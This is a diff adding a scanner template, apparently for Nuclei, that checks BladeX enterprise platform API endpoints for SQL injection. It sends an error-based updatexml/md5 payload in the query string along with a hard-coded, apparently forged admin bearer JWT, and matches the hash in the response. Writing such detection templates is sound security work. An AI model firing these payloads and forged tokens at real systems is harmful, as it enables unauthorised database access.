@@ -1,0 +1,24 @@
+id: BladeX-list-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: BladeX企业级开发平台notice/list存在SQL注入漏洞
+  reference:
+    - https://
+  tags: tags
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/blade-desk/notice/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1"
+      - "{{BaseURL}}/api/blade-log/usual/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1"
+      
+    headers:
+      Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ     
+      
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b923'
